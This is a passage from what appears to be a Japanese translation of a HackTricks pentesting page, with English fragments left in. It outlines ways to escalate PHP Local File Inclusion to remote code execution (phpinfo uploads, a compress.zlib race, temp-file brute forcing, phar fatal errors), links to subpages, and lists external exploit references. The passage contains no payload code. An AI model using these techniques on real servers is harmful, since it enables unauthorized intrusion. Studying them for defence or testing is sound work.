もし**Local File Inclusion**を発見し、**phpinfo()**が file_uploads = on で公開されているファイルがあれば、RCE を得られます:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### 経由 compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

もし**Local File Inclusion**を発見し、テンポラリファイルのパスを**can exfiltrate the path**できるが、**server**が**checking**していて**file to be included has PHP marks**かどうか確認している場合は、この**Race Condition**でその**bypass that check**を試すことができます:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### 経由 eternal waiting + bruteforce

もし LFI を悪用して**upload temporary files**ができ、サーバーの PHP 実行を**hang**させられるなら、何時間もかけて**brute force filenames during hours**することでテンポラリファイルを見つけられる可能性があります:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error による

もし `/usr/bin/phar`、`/usr/bin/phar7`、`/usr/bin/phar.phar7`、`/usr/bin/phar.phar` のいずれかを含めると（そのエラーを発生させるには同じファイルを2回含める必要があります）。

**I don't know how is this useful but it might be.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
